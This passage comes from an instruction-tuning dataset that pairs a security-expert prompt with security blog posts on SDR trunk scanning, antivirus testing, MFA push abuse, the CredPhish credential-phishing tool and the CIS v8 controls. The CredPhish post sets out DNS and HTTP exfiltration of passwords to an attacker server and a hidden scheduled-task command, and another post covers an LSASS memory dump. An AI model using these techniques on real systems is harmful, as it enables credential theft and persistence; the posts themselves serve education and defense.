        "output": "Ray Felch Introduction Recently I came across an interesting article on using software-defined radio SDR to create a Police Fire EMS and Public Safety systems scanner Viewing a few of these Trunk tracking scanners on Amazon I quickly discovered that they are not cheap at all You can spend several hundred dollars on a Trunked Radio tracking scanner however we can build one with just two 25 SDR USB dongles How Trunking systems work Trunking systems carry an exceptionally large volume of analog and digital radio traffic and are a frequency hopping system Trunk systems are controlled by computers and broadcast information to all the radios on the network by way of a control channel In the following diagram notice that the control channels appear in red The channels that are displayed in green are the allotted frequencies for a given Talkgroup an assigned group on a trunked radio system Wikipedia defines a talkgroup as follows A talkgroup is an assigned group on a trunked radio system Unlike a conventional radio which assigns users a certain frequency a trunk system takes several frequencies allocated to the system Then the control channel coordinates the system so talkgroups can share these frequencies seamlessly If we were to tune to the control channel frequency using SDR software-defined radio software we would discover the following waterfall Not only is it visually recognizable but it also has an incredibly unique raspy metallic digital sound All radios in the talkgroup monitor the control channel to know which frequency to listen to Virtual channels are created by an admin and assigned talkgroup numbers listed in the Target column of UniTrunker When the user pushes the PTT push-to-talk key a request is sent to the control computer The control computer then assigns a frequency and all radios logged into that talkgroup switch to that assigned frequency so they can hear the transmission When the transmission is responded to this process is repeated and typically a different frequency is assigned for the reply It becomes apparent that if we were to monitor a single frequency we would miss most of the radio traffic for a given talkgroup's system Why the trunking system was created Trunking systems provide very efficient use of the radio spectrum Prior to its implementation radio frequencies that were assigned were static An example could be made that a police agency needing a dozen conventional channels would waste that portion of the spectrum if the channel were idle for any significant amount of time In the 'trunked system the officers would be assigned to a talkgroup and not a dedicated channel and share a smaller pool of channels It is common for greater than 350 talkgroups to share as few as 20 channels Another benefit of a trunking system is multiple sites at separate locations can be linked together School campuses consisting of multiple buildings in various parts of the city can all be linked Even cities states and provinces can be linked together My location here in Iowa borders Illinois so talkgroups for law enforcement fire and safety share a common control channel UniTrunker Trunk Radio decoding software UniTrunker is a Trunk Radio decoder that supports Motorola Type II EDACS MPT1327 P25 systems and works well with RTL-based SDRs To build our SDR-based Trunked Radio scanner we will need to install UniTrunker as well as a few other required dependencies Note When I first attempted to install these programs I ran into a few problems mostly due to the order that I installed things That being the case I will attempt to present this information in a structured step-by-step manner and hopefully prevent you from making the same mistakes Note We will be using an extremely popular online site RadioReference.com to find the control channels for our location We need to download the following software I will walk you through it It is not that bad really SDR Sharp UniTrunker Virtual Cable DSDPlus SDR Sharp SDR Install procedure Note You will not need SDR Sharp to build our UniTrunker tracking radio scanner however it will come in handy to ensure the required RTL-SDR drivers and WinUSB drivers have been installed properly Also we will be using SDR Sharp to verify that the listed control channel frequency specified is accurate The Radio Reference group attempts to keep their databases up to date however sometimes the listed control channels may be outdated or recently changed slightly shifted SDR Sharp is also a fun to play with piece of software You can tune to frequencies in the FM radio band 88MHZ to 108MHz and find your favorite radio stations for your area I typically will use SDR Sharp to tune into the listed control channel frequency to be sure the frequency is accurately listed I.e For my location in southeast Iowa the RACOM Network control channel frequency for my neighboring city of Rock Island Illinois is displayed as 857.2375MHz Control channels are always displayed in red However checking this with SDR Sharp shows the frequency needs to be 857.1375MHz shifted down by 100KHz We will need to remember this frequency when we configure the UniTrunker software later Note I chose the 'unskinned version of SDR Sharp version for this demo Visit irspy.com and click Download Scroll down a few lines and find the link for 'unskinned SDR click where it says here Insert the rtl-sdr USB dongle s Download the SDR Sharp zip file Double-click the zip file and extract the files to a folder of your choice Navigate to the extracted folder Execute install-rtlsdr.bat This installs RTL-SDR drivers and writes the file zadig.exe to the folder WinUSB driver using zadig exe Install procedure Right mouse-click on zadig.exe and Run as Administrator Answer Yes to Allow this app to make changes to this device Select Options List Devices Select Bulk-In Interface Interface 0 Click Install Driver Verify a successful SDR Sharp install by executing SDRSharp.exe Don't forget to select the RTL-SDR under Devices after SDR Sharp loads DSDPlus Digital decoder software Install procedure Visit ww.dsdplus.com download-2 Click on DSDPlus v1.101 link Click on DSDPlus v1.101_DLL_Files Navigate to Downloads folder Right mouse-click on the DSDPlus v1 101 zip file and extract all Right mouse-click on the DSDPlus v1 101 DLL zip file and extract-all Navigate to the DSDPlus DLL extracted folder Press CTL-A select all and move them to the DSDPlus extracted folder Click on DSDPlus.exe to run DSDPlus We will see a few windows pop open and we now know DSDPlus is up and running Virtual Cable Install procedure Visit b-audio.com Cable index.htm Click the orange Download for Windows Navigate to the Downloads folder Right mouse-click on the zip file and extract-all Navigate to the VBCABLE_Driver_Pack43 extracted folder Right mouse-click and Run as Administrator VBCABLE_Setup_x64.exe Click Install Driver When completed reboot Windows After Reboot We can quickly verify that VB-Cable is installed properly by clicking VBCABLE_ControlPanel.exe We should see the following window open This indicates a successful install and we can now close this window Configuring VB Cable Hover over the speaker icon bottom right on the task bar Select Sounds Playback Ensure that the speakers are the default for Playback Click the Recording tab Left mouse-click one time on the VB Cable to highlight it Right mouse-click and select Set as default Click OK Configure UniTrunker With all the required dependencies now installed we are ready to install configure and run UniTrunker UniTrunker software Install procedure Visit ww.unitrunker.com download Select the latest released version UniTrunker version 1.0.33.6 in my case Navigate to the Downloads folder Double-click on UniTrunker-1.0.33.6.msi to install Info UniTrunker will be installed to C Program Files x86 Note Do not create a shortcut for uniform.exe UniTrunker instead click the Windows logo type unitrunker right mouse-click on the app and select Pin to taskbar or optionally Pin to Start Click the UniTrunker icon on the taskbar Click First time installation Click the plus button to add a receiver we'll need to do this twice once for SDR-1 and then again later for SDR-2 for now let us configure SDR-1 Click the RTL2832 button The following is my configuration for both receivers SDR-1 and SDR-2 After completing the configuration for receiver 1 SDR-1 repeat the process by clicking the plus button again and selecting RTL2832 for receiver 2 SDR-2 Important The settings highlighted in yellow are the only differences between the two receivers and it is especially important to enumerate these settings exactly as shown above The only exception is the name you give the receiver in the Model field I chose to name the first receiver SDR-1 Control channel and the second receiver SDR-2 Scanner You are free to call them anything you like Also the Park value frequency underlined in red SDR-1 receiver is set according to my location here in Iowa and it will need to be changed to one of your control channel frequencies as per the Radio Reference database for your area That is it Everything is installed and we are ready to operate our Trunked scanner Ensure that DSDPlus is running and click the Play arrow Start on both receivers You should now see the following in the UniTrunker window and the scanner should open and be operational Conclusion This was a fun project that opened some new avenues for me in the realm of software-defined radio There are a ton of interesting features to explore as this is a very robust application Interestingly DSDPlus is also an amazing tool that takes care of decoding the digital trunk traffic into something we can hear While researching this project I discovered that there is quite a bit of information out there regarding UniTrunker as well as the implementation of other SDR based projects I even ran across another SDR Trunk tracking scanner application known as SDR Trunker although I have not reviewed it yet"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Is This Thing On?</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, How-To, Informational, InfoSec 101, Michael Allen, Michael Allen</taxonomies>\n<creation_date>Wed, 26 May 2021 19:09:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "How to make sure your antivirus is working without any malware Michael Allen Recently a customer asked me if there was a way they could generate alerts from the new antivirus product they deployed without executing any actual malware on the system they were testing it on The computer they wanted to test was an especially sensitive and business-critical system so it was important that they perform the test without executing any third-party code Additionally I wouldn't have direct access to the system they were testing this question came up after their pentest was already complete so the methods I shared with them needed to be easily communicated to a system administrator and not rely on any specialized hacking tools like Metasploit that might not be available inside the environment I thought this was an interesting scenario that other defenders might also face so I decided to share some of my suggestions here on the BHIS blog Keep in mind this is by no means an exhaustive list of all the different tests that can be done of an antivirus product nor all the different ways that any given feature of an antivirus product can be tested This is just a starting point for some relatively easy tests that can be performed without any third-party tools 1 Testing malware file detection with the EICAR test file The EICAR test file was designed by the European Institute for Computer Antivirus Research EICAR and Computer Antivirus Research Organization CARO specifically for testing antivirus programs It contains only the following ASCII text along with some optional trailing whitespace and can easily be created by pasting the text into a text editor and then saving the file to disk X5O!P AP 4 PZX54 P 7CC 7 EICAR-STANDARD-ANTIVIRUS-TEST-FILE H H EICAR Test File Contents The two screenshots below show a simple example of pasting the EICAR string into Windows Notepad and then saving it as a file with the .EXE extension EICAR Data Pasted into Notepad Saving the EICAR File to Disk The file can also be downloaded directly from the EICAR website here ecure.eicar.org eicar.com.txt Once the EICAR file is saved to disk it should generate an alert from any antivirus products installed on the computer Some antivirus products limit automatic file scanning to only those files that have certain file name extensions e.g .EXE so I recommend saving several copies of the file with different extensions that you want to test If some of the files get detected and others don't you'll know that your antivirus product doesn't automatically scan certain file extensions For example you might notice that saving the file with a .TXT or .JPG extension doesn't cause it to get detected while saving it as a .COM .EXE or .DOCM does Here's an example that shows a folder where I saved multiple copies of the file under names with various file extensions EICAR File Saved as Files with Various Extensions And here's part of the alert that was shown when Windows Defender detected those files Alert from Detection of Test Files Partial 2 Testing malware detection in Alternate Data Streams On computers that use the NTFS filesystem malware can also be stored in a file's Alternate Data Stream ADS rather than inside the file itself This technique has been used by malware authors for years in attempts to hide malware on disk since some antivirus products may not check for malicious data stored inside Alternate Data Streams Using PowerShell you can easily create an Alternate Data Stream that contains the EICAR test file and confirm whether your antivirus software scans for malware inside an ADS The first PowerShell command below creates the file ADS_Test.txt which just contains the text string Nothing to see here This file doesn't actually contain any malicious code but the second command adds an Alternate Data Stream named EICAR to the file and stores the EICAR string inside the ADS set-content ADS_Test.txt Nothing to see here set-content ADS_Test.txt EICAR 'X5O!P AP 4 PZX54 P 7CC 7 EICAR-STANDARD-ANTIVIRUS-TEST-FILE H H PowerShell Commands for Creating an ADS Containing the EICAR String The screenshot below shows execution of these two commands along with a Get-Content command in between that just confirms the presence of the ADS_Test.txt file by displaying its contents Execution of the PowerShell Commands Above Like the test files that were created in the last section the malicious Alternate Data Stream was also detected by Windows Defender Detection of EICAR Data in the ADS 3 Testing in-memory detection of malicious scripts with AMSI Similar to the EICAR string Microsoft's Antimalware Scan Interface AMSI has its own test string shown below 'AMSI Test Sample 7e72c3ce-861b-4339-8740-0ac1484c1386 AMSI Test String AMSI allows antivirus products to scan for malicious code inside of commands and scripts that are executed inside of PowerShell processes Microsoft Office Macros and Windows-supported scripting languages like VBScript and JavaScript This functionality is critical in a defensive product since many payloads can be downloaded into memory and executed without ever being written to disk thus preventing them from being detected by the traditional file-scanning antivirus functions tested in the previous sections To test whether AMSI is enabled and detecting malware on your system open a PowerShell or PowerShell ISE window and paste in the test sample text shown above If AMSI is enabled and working on your system you should see a message like the one shown below Detection of AMSI Test String If for some reason the test string isn't recognized as malicious you can also try strings like the ones below that are present in well-known hacking tools 'amsicontext 'Invoke-Mimikatz Detection of Hacking Tool Strings If you don't have a solid understanding of PowerShell error messages be sure you include the single-quote characters at the beginning and end of each string when performing these tests The test strings aren't valid PowerShell syntax by default so if you run them without the quotes other error messages will be displayed that could cause some confusion Successful detection of the malicious strings will generate an error that specifically states This script contains malicious content as opposed to more generic error text like The term is not recognized or ObjectNotFound 4 Testing behavior-based detection with Windows Task Manager The last example I'll demonstrate here simulates behavior that might occur after successful malware execution rather than simulating the malware's presence on disk or in memory Behavior is less frequently detected by antivirus products than the presence of known malware data on disk or in memory so depending on the product you're using you may need to supplement your antivirus with other endpoint detection and response EDR options to see a detection To perform this test first execute Windows Task Manager with elevated Administrator privileges Administrative Execution of Task Manager from the Windows Start Menu After you start Task Manager click the More details button near the bottom of the window More details Button Then click the Details tab and scroll down in the list until you find the lsass.exe process lsass.exe Shown Under Details Right-click on lsass.exe and then click on Create dump file in the menu that appears Create dump file At this point Task Manager will attempt to read the memory contents of the LSASS process and save the data to a file The LSASS process memory is commonly targeted by attackers since it may contain login credentials or password hashes for users that have logged into the system When this process begins you'll see a window appear like the one below Memory Dump in Progress If your antivirus or other endpoint defense product detects the malicious behavior the Task Manager window may close abruptly or you may see a notification from the defensive software If the behavior is not detected on the other hand the dump file will be created in the current user's Temp directory and you'll see the following window appear Memory Dump Complete Double check the Temp directory to be sure that the file was created successfully this will also confirm that the malicious behavior was not blocked If the file exists be sure to delete it when you're done since it's likely to contain credentials or other information that would be useful to an attacker should your system get breached Conclusion Like I mentioned at the start of this article this isn't meant to be a perfect or complete test but hopefully it will give you a starting point from which to tell if your antivirus software is working the way you expect it to especially in environments where your ability to upload externally generated test files to systems may be limited Keep in mind that detection of the EICAR and AMSI test data doesn't necessarily indicate that an antivirus product parses files of a given type successfully After all the test files created in this article only contain a single well-known ASCII string so they're extremely easy to detect through basic means and may not necessarily represent properly formatted program executables or document files that might have malicious code stored in a macro or at the very least some place other than line one Detection of the EICAR test file does at least confirm that your antivirus product is scanning files though The same is true if the AMSI test string is detected at least you know that your antivirus product is hooking into AMSI scanning code and generating alerts Last if you're interested in a more thorough assessment of the endpoint security controls in use in your environment than just those I've described here check out our Services page or Contact us for information about our Command Control and Data Exfiltration Assessment service and let us show you the blind spots your antivirus EDR and network security controls may miss"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Backdoors & Breaches LIVE - 5/19/2021</title>\n<taxonomies>Backdoors & Breaches, Blue Team, Blue Team Tools, Fun & Games, Informational</taxonomies>\n<creation_date>Fri, 28 May 2021 12:54:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be vZLNdZLHKz4 Join our Incident Master Ean Meyer as we play another round of Backdoors Breaches B B session using our new Tabletop Simulator TTS version If you have STEAM TABLETOP SIMULATOR BACKDOORS BREACHES WORKSHOP you can play using the same version of the game https steamcommunity.com sharedfiles filedetails ?id 2401033477 Incident Master Ean EanMeyer Defenders Qasim hashtaginfosec Kaitlyn Kadawi Blake zer0cool Vee Po1Zon_P1x13 Ralph ralphte1 Game Play Master Jason BanjoCrashland Our good friend Edward Miro wrote an extensive guide on how to install and use B B on TTS Check it out below ww.blackhillsinfosec.com backdoors-breaches-tabletop-simulator-guide"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Pushing Your Way In</title>\n<taxonomies>Author, David Fletcher, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Red Team, Red Team Tools</taxonomies>\n<creation_date>Fri, 09 Jul 2021 15:28:16 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Over the past several years attackers have gained significant traction in targeted environments by using various forms of password guessing This situation was reflected in the 2020 Verizon DBIR under top threat action varieties Use of stolen credentials sits right behind phishing as the second most utilized threat action in disclosed breaches Malware variants don't appear until number seven item in that list As a result of the above organizations rapidly adopted Multi-Factor authentication on their critical internet-facing services like Virtual Private Networks VPNs Virtual Desktop Infrastructure VDI web-based email portals and many others The COVID 19 crisis served to exacerbate this situation as entire organizations transitioned to remote work Like other forms of security two-factor authentication is not a silver bullet Attackers have come up with ingenious ways to bypass two-factor authentication using reverse proxy software like CredSniper Modlishka and Evilginx2 On some services even when two-factor authentication is enforced the order of operations that the service uses to perform the secondary factor may allow an attacker to validate user credentials When this happens the attacker can still perform attacks like password spraying to identify weak passwords Then the attacker can use the validated credentials to attempt to authenticate to other services exposed by the organization and verify that two-factor implementation is uniform across the organization Services that serially check credentials can also be used to identify accounts where two-factor is not enabled Over time we have observed one technique that seems to be highly effective when we can find services with two-factor enabled that allow us to validate credentials before checking that secondary authentication factor First we typically perform password spraying as described above If you are not familiar with password spraying here are some good references that describe the technique ww.blackhillsinfosec.com password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2 ww.blackhillsinfosec.com introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data Next with valid credentials at hand we send push notifications to users whose accounts are configured to support them and see who blindly accepts Often we will perform this activity at specific times of the day like 8-9 am 12-1 pm or 6-7 pm in the target user's time zone These times are chosen because they are likely to be around the same time that the user authenticates for the first time in the morning returns from lunch or authenticates after leaving the office Even with a small number of valid credentials this technique appears to be very effective Because of the above it is critical that users are properly trained to spot anomalous behavior associated with two-factor authentication All of the following are indicators of compromise that users should be educated on and reporting to the information security department Unsolicited phone call verifications Unsolicited push notifications Sign-in notifications from new locations devices On many of our engagements the activities listed above never get reported When these activities occur it means that in no uncertain terms the user's password has been compromised If users do not understand that correlation they will never report the activity With so many organizations moving significant portions of their IT infrastructure into the cloud a compromise like this can have devastating consequences One such scenario was just discussed in our Attack Tactics 8 webcast outu.be zdviQia1XD8"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Phish for User Passwords with PowerShell</title>\n<taxonomies>How-To, Informational, InfoSec 101, Phishing, Red Team</taxonomies>\n<creation_date>Tue, 27 Jul 2021 14:22:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "tokyoneon Spoofing credential prompts is an effective privilege escalation and lateral movement technique It's not uncommon to experience seemingly random password prompts for Outlook VPNs and various other authentication protocols in Windows environments Adversaries will abuse functionalities built into Windows and PowerShell to invoke credential popups to acquire user passwords As defined by the MITRE ATT CK Framework When programs are executed that need additional privileges it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task Adversaries may mimic common operating system components to prompt users for credentials with a seemingly legitimate prompt via languages such as PowerShell What is CredPhish CredPhish is a PowerShell script designed to invoke credential prompts and exfiltrate passwords It relies on the CredentialPicker API to collect user passwords PowerShell's Resolve-DnsName for DNS exfiltration and Windows Defender's ConfigSecurityPolicy.exe to perform arbitrary GET requests Below is an example of CredPhish in action Notice the credentials delivered to the attacker's DNS server immediately after they're submitted in the Windows Security prompt By default CredPhish will use Resolve-DnsName a DNS resolver built into PowerShell to exfiltrate credentials It will convert each character in the credentials to its respective hexadecimal value break the converted values into predefined chunks and place the chunks into subdomains of popular websites The below screenshot is an example of exfiltrated credentials in hexadecimal form Notice the hexadecimal values for tokyoneon 746f6b796f6e656f6e in the google.com and office.com subdomains Before resolving a DNS query the DNS server will strip the hexadecimal subdomain to avoid creating dozens of error responses In the below Wireshark screenshot notice the Answers field no longer includes the subdomain and successfully resolves to one of Google's IP addresses CredPhish.ps1 Configuration I designed credphish.ps1 to be an isolated script that doesn't require Import-Module a common indicator of compromise The configurable options are instead at the top of the PS1 script in the form of variables to avoid lengthy command-line arguments The first line is most important as it defines where the exfiltrated data is delivered i.e the attacker's Kali server exfil address exfilServer 192.168.56.112 Next several variables define how the prompt will appear to the unsuspecting target user The promptCaption defines the application requesting user credentials e.g Microsoft Office And the promptMessage usually specifies the account associated with the request prompt targetUser env username companyEmail blackhillsinfosec.com promptCaption Microsoft Office promptMessage Connecting to targetUser companyEmail maxTries 1 maximum number of times to invoke prompt delayPrompts 2 seconds between prompts validateCredentials false interrupt maxTries and immediately exfil if credentials are valid The maxTries variable defines how many times the prompt will appear before the target submits credentials To avoid suspicion 1 is the default value The delayPrompts variable defines how many seconds between each prompt if maxTries is greater than 1 And validateCredentials disabled by default will attempt to locally validate the submitted credentials by using Start-Process in an elevated context If enabled and the credentials are validated maxTries is ignored and the data is sent to the attacker's server immediately Exfiltration Methods As mentioned DNS exfiltration is the default method used to deliver passwords to the attacker's server The exfilDomains list includes various domains used in DNS queries and chosen at random The subdomainLength variable determines the desired length of each subdomain dns start dns server in kali python3 path to credphish dns_server.py enableDnsExfil true exfilDomains '.microsoft.com '.google.com '.office.com '.live.com domains for dns exfil randomDelay get-random -minimum 5 -maximum 20 delay between dns queries subdomainLength 6 maximum chars in subdomain must be an even number between 2-60 or queries will break To intercept credentials sent with the DNS exfiltration function execute the dns_server.py script in Kali Press Ctrl c to terminate the DNS server and it will reconstruct the intercepted credentials in plaintext Another method of exfiltration built into CredPhish is the HTTP request method It leverages ConfigSecurityPolicy.exe a binary included in Windows Defender to deliver credentials to the attacker's server Set the enableHttpExfil variable to true to enable it http start http server in kali python3 -m http.server 80 enableHttpExfil false ConfigSecurityPolicy C Prog Files Win Defender ConfigSecurityPolicy.exe To intercept credentials sent with ConfigSecurityPolicy.exe start a simple HTTP server in Kali to capture them in the logs On the network the exfiltrated credentials will appear as shown below GET DESKTOP-S4DAAF0 5Btokyoneon 3A 23!Extr3m3Ly_ 26ecuRe-P 40ssw 25rD 23 5D HTTP 1.1 Accept UA-CPU AMD64 Accept-Encoding gzip deflate User-Agent Mozilla 4.0 compatible MSIE 7.0 Windows NT 10.0 Win64 x64 Trident 7.0 .NET4.0C .NET4.0E Host 192.168.56.104 Connection Keep-Alive As the credentials are URL encoded before transmission use Burp's Decoder module to observe the data or Python's urllib library to URL decode via command-line from urllib.parse import unquote unquote DESKTOP-S4DAAF0 5Btokyoneon 3A 23!Extr3m3Ly_ 26ecuRe-P 40ssw 25rD 23 5D DESKTOP-S4DAAF0 tokyoneon !Extr3m3Ly_ ecuRe-P ssw rD CredPhish.ps1 Execution To quickly test CredPhish move the credphish.ps1 to the target Windows 10 machine and execute it with PowerShell A persistent method of execution might involve Task Scheduler a component of Windows that provides the ability to schedule script executions at predefined intervals The below schtasks example will execute credphish.ps1 every 2 minutes schtasks create sc minute mo 2 tn credphish tr powershell -ep bypass -WindowStyle Hidden C path to credPhish credphish.ps1 Mitigations Detection CredPhish derived from projects like Invoke-LoginPrompt CredsLeaker and Stitch isn't a silver bullet for password phishing There's always room for improvement as this kind of attack is typically very targeted and user-specific A more aggressive approach might involve spoofing the entire Windows 10 lock screen with Cobalt Strike and capturing credentials that way These types of attack techniques are not easily mitigated with preventive controls as they abuse system features The MITRE ATT CK Framework recommends Exercise user training as a way to bring awareness and raise suspicion for potentially malicious events and dialog boxes e.g Office documents prompting for credentials Monitor process execution for unusual programs and malicious instances of Command and Scripting Interpreter's which prompt users for credentials Inspect and scrutinize input prompts for indicators of illegitimacy such as non-traditional banners text timing and or sources"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Center for Internet Security (CIS) v8  Why You Should Care</title>\n<taxonomies>Author, Dale Hobbs, General InfoSec Tips & Tricks, Informational, InfoSec 101</taxonomies>\n<creation_date>Thu, 12 Aug 2021 15:05:11 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dale Hobbs The Center for Internet Security CIS Controls are a recommended set of highly effective defensive actions for cyber defense that provide specific and actionable methods to prevent the most dangerous and pervasive cyber-attacks They were initially developed by the SANS Institute and were originally known as the SANS Critical Security Controls They are the combined knowledge of a variety of industry experts from every market into what is effectively a must-do starting point for any organization large or small The CIS Controls provides a prioritized path to help organizations improve their cybersecurity program In May 2021 the Center for Internet Security released the latest iteration of the CIS Controls Version 8 v8 After re-assessing the Controls and how they matched up against the modern threat landscape they are now task-focused and grouped by activity as opposed to which group s in an organization manage the devices relevant to each control As a result the CIS Controls have been reduced from 20 down to 18 These 18 Controls contain 153 safeguards formerly known as sub-controls as opposed to 171 in v7.1 and they have done a much better job at incorporating both Cloud and Mobile technologies This was an area that was lacking in v7.1 so this is a big step in the right direction V8 still makes use of the three Implementation Groups IGs that were introduced in v7.1 In case you are not familiar with these groups let's recap IG1 is aimed at small to medium-sized organizations with limited in-house IT and security staff whose primary concern is to keep the business running and who have little tolerance for any downtime and or disruption The goal with IG1 is that the safeguards can be implemented with limited expertise can be implemented with commercial off-the-shelf hardware and software and are generally aimed at your run-of-the-mill non-targeted attacks IG2 includes all of the safeguards from IG1 but is aimed at organizations that have dedicated IT and security staff whose primary goal is to protect the organization's IT infrastructure These organizations are usually able to tolerate short periods of downtime and or disruption and are primarily concerned with reputational damage should a breach occur The safeguards for IG2 will generally require enterprise-grade technology and specialized expertise in order to effectively implement these technologies IG3 includes all of the safeguards from IG1 and IG2 Organizations at this level will usually have security staff with a specialized skillset such as Penetration Testing Incident Response or Digital Forensics to name a few These organizations are generally subject to specific regulatory or compliance requirements The safeguards for IG3 are aimed at mitigating targeted attacks from today's sophisticated adversary Let's dive in and take a high-level look at v8 of the CIS Controls The first thing you will notice aside from there now only being 18 controls is that some of the names have changed from v7.1 and the ordering of some of the controls has changed as well This was done to align with the task-based grouping by activity approach that the CIS has taken with v8 Control v8 v7.1 1 Inventory and Control of Enterprise Assets Inventory and Control of Hardware Assets 2 Inventory and Control of Software Assets Inventory and Control of Software Assets 3 Data Protection Continuous Vulnerability Management 4 Secure Configuration of Enterprise Assets and Software Controlled use of Administrative Privileges 5 Account Management Secure Configurations for Hardware and Software on Mobile Devices Laptops Workstations and Servers 6 Access Control Management Maintenance Monitoring and Analysis of Audit Logs 7 Continuous Vulnerability Management Email and Web Browser Protections 8 Audit Log Management Malware Defenses 9 Email and Web Browser Protections Limitation and Control of Network Ports Protocols and Services 10 Malware Defenses Data Recovery Capabilities 11 Data Recovery Secure Configuration for Network Devices such as Firewalls Routers and Switches 12 Network Infrastructure Management Boundary Defense 13 Network Monitoring and Defense Data Protection 14 Security Awareness and Skills Training Controlled Access Based on the Need to Know 15 Service Provider Management Wireless Access Control 16 Application Software Security Account Monitoring and Control 17 Incident Response Management Implement a Security Awareness and Training Program 18 Penetration Testing Application Software Security 19 Incident Response and Management 20 Penetration Testing and Red Team Exercises Control 1 Inventory and Control of Enterprise Assets This was formerly called Inventory and Control of Hardware Assets The key to this control is that it focuses on ALL enterprise assets This includes IoT mobile and those assets located within Cloud environments The traditional network borders no longer exist and knowing what assets are in your ENTIRE environment is crucial in order to protect the organization After all you can't protect what you don't know exists Control 2 Inventory and Control of Software Assets The goal of this control remains unchanged from v7.1 with the intent of knowing and maintaining an inventory of all software within the organization Like Control 1 you can't manage what you do not know exists Having an accurate software inventory allows you to ensure ALL software is managed And by software we are not just referring to applications like Adobe Reader and Microsoft Office Software also includes the Operating Systems not just of your servers desktops and laptops but also your firewalls routers and switches Oh and don't forget that Smart TV in the lunchroom Control 3 Data Protection This control brings some welcome changes and extends to the data stored in the Cloud Our physical borders no longer exist so it stands to reason that borders no longer apply to our data either Your data is not only valuable to your organization but it's also valuable to a criminal so classifying and protecting ALL of your company data should be a high priority for any organization that includes your data that lives in the Cloud Control 4 Secure Configuration of Enterprise Assets and Software This is another control where non-traditional computing devices such as IoT devices have finally been taken into consideration Not only is it critical to have secure configurations for laptops servers and workstations but we also need to factor in configurations for non-computing IoT devices such as factory equipment inventory tracking devices and medical equipment to name a few Having a secure and standardized configuration significantly improves the security and reduces the management overhead of these assets Control 5 Account Management Criminals have shifted a lot of their focus from traditional malware-based attacks to attacks against user credentials whether in phishing attacks or utilizing stolen credentials All accounts including administrative and service accounts need to be treated with the same due diligence as hardware and software-based assets This means knowing what accounts are active and which are dormant and ensuring that no two accounts have the same password Password re-use is a no-no and easily managed with tools such as Microsoft LAPS Control 6 Access Control Management You might wonder why Controls 5 and 6 are treated as separate controls Control 5 deals with the account management itself whereas Control 6 deals with the management of what access these accounts have Accounts should only have the minimum level of access required in order to perform their desired function An Identity and Access Management IAM solution provides the foundation for access management Performing this manually is a tedious task and can lead to mistakes in configuration Automating this with an IAM solution is critical to successfully implementing this control Control 7 Continuous Vulnerability Management This control previously lived at the 3 spot in the Controls Why was it moved to 7 That's a good question You'd have to ask the CIS for an official answer but the fact is that exploiting vulnerabilities while still important has taken a bit of a back seat to user-based attacks according to the 2020 Verizon Data Breach Investigations Report DBIR That said this is still a never-ending game of cat and mouse so it's important to have an effective vulnerability management program in your environment that can provide timely access to known unmanaged or unmitigated vulnerabilities within your organization Just because it moved from 3 to 7 doesn't mean you should reduce its focus and attention Control 8 Audit Log Management You wouldn't drive your car with your eyes closed so why would you operate your infrastructure with no visibility Without proper logging it's very difficult to detect a potential compromise or attack Not only will having the right logs help your Incident Response IR team determine what happened during an investigation it will also aid your Security Team in detecting an attack quicker The sooner we can discover an attack the sooner it can be managed and the more likely it becomes that the damage can be minimized There are generally two types of logs System logs and Audit logs Security incidents are not always discovered from Audit logs In many cases it's a sudden decrease in system performance that triggers an investigation so it's crucial that both System and Audit logs are appropriately configured for your environment Control 9 Email and Web Browser Protections Email and Web Browsers are typically how your users interact with the world outside your environment They are how a user interacts with a website or accesses their email and as such they're common points of entry for an adversary not only through the use of malicious code but also through social engineering Ensuring that appropriate protection mechanisms are in place for these tools is crucial Things like URL filtering to restrict the types of sites a user can visit disabling unauthorized and unvetted browser plugins 